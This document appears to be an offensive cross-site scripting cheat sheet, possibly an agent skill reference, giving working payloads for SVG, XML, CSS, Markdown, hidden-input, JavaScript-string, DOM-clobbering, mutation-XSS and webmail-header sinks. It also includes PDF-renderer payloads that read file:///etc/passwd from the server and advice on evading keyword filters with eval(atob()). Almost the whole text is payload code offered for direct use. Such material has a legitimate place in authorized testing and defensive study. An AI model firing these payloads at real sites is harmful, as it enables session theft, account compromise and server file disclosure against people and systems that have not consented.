# Non-trivial sink-context payloads — Open WHEN: the reflection lands in SVG/XML/CSS/Markdown/PDF, an uploaded file, a hidden/meta/unexploitable tag, a JS string/template literal, or a content-type other than text/html

Body already covers: context-encoding table, mXSS `<noscript>` example, DOM-clobbering
mention, prototype-pollution `__proto__`, SVG-as-active-content, file-upload MIME notes,
Markdown passthrough, PDF JS-in-links, postMessage source list. Everything below is the
concrete per-sink markup, non-overlapping with that.

## Full SVG upload payload (served as image/svg+xml or text/html → inline execution)
Every line below executes independently — include several so at least one fires:
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" width="100" height="100"
     xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribute')">
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('fo iframe')" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">alert('svg script')</script>
</svg>
```
Short forms:
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```
`<use>` / nested-SVG dereference (data: fragment executes; remote href does NOT):
```xml
<svg><use href="//SRV/upload.php#x"/></svg>
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)'/&gt;&lt;/svg&gt;#x"/>
```
Nested sub-SVG (`<svg x="10">...<script>...`) DOES execute — remote `xlink:href`/`use` to an
external SVG does not run that file's embedded script.

## XML / XHTML content-type contexts (text/xml, application/xml, image/svg+xml)
Namespace an XHTML node inside an XML doc to run JS:
```xml
<xml><text>hello<img src="1" onerror="alert(1)" xmlns="http://www.w3.org/1999/xhtml"/></text></xml>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```
CDATA wrapper keeps a JS payload from being parsed as XML markup:
```xml
<name><value><![CDATA[<script>confirm(document.domain)</script>]]></value></name>
```
Content-types that execute JS in all browsers: `text/html`, `application/xhtml+xml`,
`application/xml`, `text/xml`, `image/svg+xml`. A loaded `<script src>` only runs if served
as one of `application/javascript`, `text/javascript`, `application/ecmascript`,
`text/jscript`, `application/x-javascript` (else "MIME type not executable").

## CSS context (style block / style attribute)
Break OUT of a `<style>` block via a data-URI string boundary:
```html
<style>div{background-image:url("data:image/jpg;base64,</style><svg/onload=alert(document.domain)>");}</style>
```
Style-driven auto-firing handlers (no click needed):
```html
<p style="animation:x;" onanimationstart="alert()">XSS</p>
<p style="animation:x;" onanimationend="alert()">XSS</p>
<div style="position:fixed;top:0;right:0;bottom:0;left:0;z-index:5000" onmouseover="alert(1)"></div>
```

## Markdown renderers (HTML/scheme passthrough)
```
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

## Hidden input / meta / "unexploitable" tags
```html
<button popovertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)"/>
<meta name="apple-mobile-web-app-title" content="" popover id="n" onbeforetoggle="alert(2)"/>
<button popovertarget="n">x</button><div popover id="n">x</div>
<input type="hidden" accesskey="X" onclick="alert(1)">   <!-- ALT+SHIFT+X / CTRL+ALT+X -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```
Attribute breakout skeleton: `" accesskey="x" onclick="alert(1)" x="`

## JS-string / template-literal breakouts (input echoed inside <script>)
Escape the `<script>` tag entirely (HTML parses before JS, so the close tag wins):
```html
</script><img src=1 onerror=alert(document.domain)>
```
Break the string, inject, repair (keeps parse valid):
```
'-alert(document.domain)-'        ';alert(document.domain)//        \';alert(document.domain)//
?param=test";<INJECTION>;a="      // JS-in-JS: end string ; inject ; repair
```
Template-literal (input inside backticks):
```javascript
${alert(1)}        ;`${alert(1)}`        function loop(){return loop} loop``
```
`eval(atob(...))` to shorten + dodge naive keyword filters; use unicode-escaped identifiers
(`eval(atob('...'))`) when `eval`/`atob` are matched.

## DOM clobbering (named-element references override JS variables)
Inject elements whose `id`/`name` shadow a global the page reads as an object:
```html
<a id=x><a id=x name=y href=z>     <!-- x.y resolves to the href, controllable string -->
<form id=config><input name=isAdmin value=1></form>   <!-- config.isAdmin clobbered -->
<img name=getElementById>          <!-- shadows document.getElementById -->
```
Use when a `<script>`-tag injection is impossible but the page does `if(window.X)` /
`config.url` style lookups against named DOM nodes.

## mutation XSS (mXSS) — browser re-parses "safe" markup into executable markup
Beyond the body's `<noscript>` example, these survive a parse/reserialize cycle (DOMPurify-style):
```html
<form><button formaction=javascript:alert(1)>X</button>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></table></mtext></math>
<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
```
Test wherever input is sanitized THEN re-inserted via `innerHTML` (the second parse mutates it).

## Server-side dynamic-PDF rendering (headless engine interprets HTML/JS)
If user input feeds a PDF generator, inject HTML the engine renders, or PDF link/annotation JS:
```html
<script>alert(1)</script>
<iframe src="javascript:..."></iframe>
<img src=x onerror="document.write('<script>...</script>')">
```
Read local files / SSRF from the rendering host if the engine allows it:
```html
<iframe src="file:///etc/passwd" width=900 height=900></iframe>
<link rel=attachment href="file:///etc/passwd">
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

## Stored XSS via parsed-file metadata printed with escaping disabled
When uploaded-file metadata (manifest/EXIF/config field) reaches an HTML report rendered with
`|safe` / autoescape-off, an entity-encoded tag in that field persists:
```xml
<data android:scheme="android_secret_code" android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Hunt report/notification builders that reuse parsed fields in `%s`/f-strings with escaping off.

## Webmail `List-Unsubscribe` header (rendered into the DOM)
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
The `%0a` newline survives the render pipeline in vulnerable clients; CTRL/middle-click on the
generated `target="_blank"` anchor runs the JS in the webmail origin.
